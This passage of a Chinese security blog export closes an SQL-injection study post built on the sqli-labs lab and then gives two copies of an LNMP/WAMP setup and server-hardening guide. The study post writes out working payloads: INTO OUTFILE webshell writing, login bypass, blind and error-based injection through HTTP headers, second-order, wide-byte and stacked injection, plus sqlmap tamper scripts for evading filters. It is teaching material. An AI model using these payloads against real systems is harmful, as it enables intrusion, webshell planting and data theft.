是每一项数据之间的分隔符， lines terminated by 是行的结尾符。 当错误代码是 2 的时候的时候， 文件不存在， 错误代码为 13 的时候是没有权限， 可以考虑/tmp 等文件夹。 3、 导入到文件SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。 该文件被创建到服务器主机上， 因此您必须拥有 FILE权限， 才能使用此语法。 file_name 不能是一个已经存在的文件。 有两种形式： 第一种直接将 select 内容导入到文件中： Select version() into outfile “c:\phpnow\htdocs\test.php”此处将 version()替换成一句话， 也即Select into outfile “c:\phpnow\htdocs\test.php” 然后直接连一句话 第二种修改文件结尾：Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件 解释： 通常是用‘\r\n’ 结尾， 此处我们修改为自己想要的任何文件。 同时可以用 FIELDSTERMINATED BY16 进制可以为一句话或者其他任何的代码， 可自行构造。 在 sqlmap 中 os-shell 采取的就是这样的方式， 具体可参考 os-shell 分析文章： http://www.cnblogs.com/lcamry/p/5505110.html http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,3 into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.txt” –+ 写入一句话木马 http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,’‘ into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.php” –+ 后续就可以上菜刀了 POST 注入输入正确用户名和密码 提交 username 和 password 后， 后台形成的 sql 语句为 $sql=”SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1”; 万能密码: 用户名：admin’or’1’=’1# admin ‘ # 密码：密码随便输入 $sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”; 猜测数据库第一位 uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit 增删改函数介绍 增加一行数据 INSERT insert into users values(‘16’,’lcamry’,’lcamry’); 删除一行数据 ​ 修改一行数据 updata 表名 set 列名=’新的值， 非数字加单引号’ where id=6; HTTP 头部注入User-Agent 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 Referer 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 cookie 注入 报错了 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 二次排序什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 二次排序注入思路： 黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。 黑客向服务端发送第二个与第一次不相同的请求数据信息。 服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。 注册用户名为admin’# 密码为123的账号 登录用户名 admi’# 并修改密码 可以看到admin 密码被修改了 Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ ANDpassword=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’admin’ 利用注册的admin’# 修改密码时候从数据库提取该数据 造成了数据 命令拼接 宽字节注入mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思路是将 ‘ 转换为 \’ 1、 %df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27， 我们在%5c%27 前面添加%df， 形成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。2、 将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。 这也是 bypass 的一种方法。 get 型的方式我们是以 url 形式提交的， 因此数据会通过 URLencode post 型的注入当中， 将 utf-8 转换为 utf-16 或 utf-32， 例如将 ‘ 转为 utf-16 为 � ‘ 堆叠注入1、在 SQL 中， 分号（;） 是用来表示一条 sql 语句的结束。 2、在 ; 结束一个 sql语句后继续构造下一条语句就造就了堆叠注入。 3、与union injection（联合注入）的 区别就在于 union或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠 注入可以执行的是任意的语句 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用 union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表名， 列名等信息 PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符。 堆叠注入payload： http://127.0.0.1/sqli-labs/Less-38/index.php?id=1%27;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–+ Tamper详解原始注入遇到困难时，可尝试加载相应脚本，进行绕过用法： –tamper**“脚本名称”(可使用多个tamper) sqlmap版本1.2.7.20，共有57个tamper脚本 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符，用于过滤单引号 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码(不处理已经编码的字符) 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\ 18 greatest 大于号替换为greatest，绕过对&gt;的过滤 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/_/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp;和\ \ 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 脚本base64encode.py内容 –dbs –base64encode.py 参考资料：SQL注入回顾篇(四)/#权限常用参数 sqli-SQL注入总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2FLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建-LNMPUbuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择 最小安装 格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证 环境搭建-WAMPwindows系统环境 安装ApacheApache 下载位置http://archive.apache.org/dist/httpd/binaries/win32/ 安装文件位置默认 安装完成 测试 安装mysql下载链接 https://www.zyboe.com/pan/273367p694614 一直下一步，选择默认路径安装 完成安装 配置 Development Machine：开发机器，MySQL会占用最少量的内存。 Server Machine：服务器机器，几个服务器应用会运行在机器上，适用于作为网站或应用的数据库服务器，会占用中等内存。 Dedicated Machine：专用机器，机器专门用来运行MySQL数据库服务器，会占用机器的所有可用内存。 根据自己的用途选择相应的类型配置，我这里为了后面做高并发性能测试便选择“Server Machine”类型。 常用的是TCP/IP连接，勾选该选项框，默认端口号是3306，可在输入框中更改 选择编码 添加到CMD 环境变量 设置root密码 Mysql@123 完成安装 安装PHP将文件夹复制到与apache安装路径同 编辑文件 PHP与apache的整合： 将改文件修改为php.ini: 编辑apache的配置文件： 添加首页文件 PHP与mysql整合 在php配置文件中修改拓展类型的路径： 开启mysql扩展类型 测试 创建www文件夹，并修改目录路径 数据库连接 服务器加固windows1.及时更新系统补丁 2.设置密码强度 3.屏幕保护（锁屏时间） 4.禁止远程连接 5.增强日志审核 等等。。。。 LINUX1.删除用不到的那些普通用户 2.SSH相关加固思路： SSH修改端口：不让端口扫描器轻易发现 不允许Root远程登录：root权限太大，只允许一般账户远程登录 3.防火墙加固思路：主要就是限制端口的对外访问，暴露越少相对越安全 查看用户 ，对于一些保留的系统伪账户：bin、sys、adm、uucp、lp、nuucp、hpdb、www、daemon等可根据需要锁定登陆 锁定不必要：passwd -l &lt;用户名&gt;解锁账号：passwd -u &lt;用户名&gt; ssh的配置 SSH的配置：/etc/ssh/sshd_config 重启下ssh：sudo systemctl restart ssh 验证：下次登录的时候使用的端口就是修改后的了 防火墙： #开启/关闭/查看防火墙状态sudo ufw enable|disable|status# 开通3306端口sudo ufw allow 3306/tcp# 禁用本机的3306端口sudo ufw delete allow 3306/tcp # 设置本机80端口访问的白名单：只允许192.168.0.0网段的ip访问本机80端口sudo ufw allow 80/tcp from 192.168.0.0/24# 允许此ip访问本机的所有端口（定向访问）sudo ufw allow from 192.168.0.7# 禁止这个ip访问本机（黑名单）sudo ufw delete allow from 192.168.0.2 mysql4.2.1.思考1.如果是root账号开放远程登录，那么权限太过高了，项目里也是对指定数据库开放对应的用户权限2.端口号默认是3306，很多扫描器都会盯着，那么修改下默认端口会缓解不少~3.开启binlog可以预防黑客修改数据后没法恢复的尴尬4.设置innodb一个表对应一个文件可以对黑客串改的数据进行针对性恢复PS：被修改的表应急情况下可以使用10分钟前的备份文件来保证安全性，如果不设置，那么所有表数据都是在一个文件里的（容易丢失太多数据 ） 在配置文件sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf中修改port 重启mysql Nginx通过常见的攻击手段来防护： 禁止目录浏览编辑配置文件 隐藏版本信息编辑配置文件、添加http模块中如下一行内容 限制HTTP请求方法 密码爆破后台密码爆破还是挺常见的程序里面主要就是通过验证码和ip访问频率来限制PS：后台密码设置更复杂些，加密方式选sha256来增加密码解猜的难度Nginx里面可以通过：access_module来设置ip限制的PS：某些页面只能特定ip访问，提高渗透难度还可以设置预警机制，太过频繁会提示管理人员处理 特定ip才能访问后台 : 文件上传漏洞Nginx早期版本有解析漏洞，eg：www.baidu.com/upload/1.jpg/1.php ==&gt; 1.jpg作为php代码进行执行解决：\1. 升级Nginx版本\2. 制定目录下的格式限制（可以是白名单也可以黑名单）eg：不允许upload文件夹下访问php格式的文件 PHP 防止变量覆盖：register_globals=off 防止越权访问目录：open_basedir = /var/www/html（制定目录） 防止远程文件包含：allow_url_include=off and allow_url_fopen=offlua_package_path “/etc/nginx/waf/?.lua”;lua_shared_dict limit 10m;init_by_lua_file /etc/nginx/waf/init.lua;access_by_lua_file /etc/nginx/waf/waf.lua;4. 防止显示详细的错误信息：display_errors=off 记录错误在日志文件中：log_errors=on 关闭不安全的字符串转义处理函数（防SQLi和XSS）：magic_quotes_gpc=off 如果PHP以CGI方式安装则需要关闭：cgi.fix_pathinfo=0 防御XSS（开启HttpOnly）session.cookie_httponly=1 HTTPS下提高安全性：session.cookie_secure=1 不加固的后果:获得目标服务器的权限，造成信息泄露，成为肉鸡 先整理这些，后续遇到再不断完善]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2F%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建-LNMPUbuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择最小安装格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证 环境搭建-WAMPwindows系统环境 安装ApacheApache 下载位置http://archive.apache.org/dist/httpd/binaries/win32/ 安装文件位置默认 安装完成 测试 安装mysql下载链接 https://www.zyboe.com/pan/273367p694614 一直下一步，选择默认路径安装 完成安装 配置 Development Machine：开发机器，MySQL会占用最少量的内存。 Server Machine：服务器机器，几个服务器应用会运行在机器上，适用于作为网站或应用的数据库服务器，会占用中等内存。 Dedicated Machine：专用机器，机器专门用来运行MySQL数据库服务器，会占用机器的所有可用内存。 根据自己的用途选择相应的类型配置，我这里为了后面做高并发性能测试便选择“Server Machine”类型。 常用的是TCP/IP连接，勾选该选项框，默认端口号是3306，可在输入框中更改 选择编码 添加到CMD 环境变量 设置root密码 Mysql@123 完成安装 安装PHP将文件夹复制到与apache安装路径同 编辑文件 PHP与apache的整合： 将改文件修改为php.ini: 编辑apache的配置文件： 添加首页文件 PHP与mysql整合 在php配置文件中修改拓展类型的路径： 开启mysql扩展类型 测试 创建www文件夹，并修改目录路径 数据库连接 服务器加固windows1.及时更新系统补丁 2.设置密码强度 3.屏幕保护（锁屏时间） 4.禁止远程连接 5.增强日志审核 等等。。。。 LINUX1.删除用不到的那些普通用户 2.SSH相关加固思路： SSH修改端口：不让端口扫描器轻易发现 不允许Root远程登录：root权限太大，只允许一般账户远程登录 3.防火墙加固思路：主要就是限制端口的对外访问，暴露越少相对越安全 查看用户 ，对于一些保留的系统伪账户：bin、sys、adm、uucp、lp、nuucp、hpdb、www、daemon等可根据需要锁定登陆 锁定不必要：passwd -l &lt;用户名&gt;解锁账号：passwd -u &lt;用户名&gt; ssh的配置 SSH的配置：/etc/ssh/sshd_config 重启下ssh：sudo systemctl restart ssh 验证：下次登录的时候使用的端口就是修改后的了 防火墙： #开启/关闭/查看防火墙状态sudo ufw enable|disable|status# 开通3306端口sudo ufw allow 3306/tcp# 禁用本机的3306端口sudo ufw delete allow 3306/tcp # 设置本机80端口访问的白名单：只允许192.168.0.0网段的ip访问本机80端口sudo ufw allow 80/tcp from 192.168.0.0/24# 允许此ip访问本机的所有端口（定向访问）sudo ufw allow from 192.168.0.7# 禁止这个ip访问本机（黑名单）sudo ufw delete allow from 192.168.0.2 mysql4.2.1.思考1.如果是root账号开放远程登录，那么权限太过高了，项目里也是对指定数据库开放对应的用户权限2.端口号默认是3306，很多扫描器都会盯着，那么修改下默认端口会缓解不少~3.开启binlog可以预防黑客修改数据后没法恢复的尴尬4.设置innodb一个表对应一个文件可以对黑客串改的数据进行针对性恢复PS：被修改的表应急情况下可以使用10分钟前的备份文件来保证安全性，如果不设置，那么所有表数据都是在一个文件里的（容易丢失太多数据 ） 在配置文件sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf中修改port 重启mysql Nginx通过常见的攻击手段来防护： 禁止目录浏览编辑配置文件 隐藏版本信息编辑配置文件、添加http模块中如下一行内容 限制HTTP请求方法 密码爆破后台密码爆破还是挺常见的程序里面主要就是通过验证码和ip访问频率来限制PS：后台密码设置更复杂些，加密方式选sha256来增加密码解猜的难度Nginx里面可以通过：access_module来设置ip限制的PS：某些页面只能特定ip访问，提高渗透难度还可以设置预警机制，太过频繁会提示管理人员处理 特定ip才能访问后台 : 文件上传漏洞Nginx早期版本有解析漏洞，eg：www.baidu.com/upload/1.jpg/1.php ==&gt; 1.jpg作为php代码进行执行解决：\1. 升级Nginx版本\2. 制定目录下的格式限制（可以是白名单也可以黑名单）eg：不允许upload文件夹下访问php格式的文件 PHP 防止变量覆盖：register_globals=off 防止越权访问目录：open_basedir = /var/www/html（制定目录） 防止远程文件包含：allow_url_include=off and allow_url_fopen=offlua_package_path “/etc/nginx/waf/?.lua”;lua_shared_dict limit 10m;init_by_lua_file /etc/nginx/waf/init.lua;access_by_lua_file /etc/nginx/waf/waf.lua;4. 防止显示详细的错误信息：display_errors=off 记录错误在日志文件中：log_errors=on 关闭不安全的字符串转义处理函数（防SQLi和XSS）：magic_quotes_gpc=off 如果PHP以CGI方式安装则需要关闭：cgi.fix_pathinfo=0 防御XSS（开启HttpOnly）session.cookie_httponly=1 HTTPS下提高安全性：session.cookie_secure=1 不加固的后果:获得目标服务器的权限，造成信息泄露，成为肉鸡 先整理这些，后续遇到再不断完善]]></content>
  </entry>
</search>
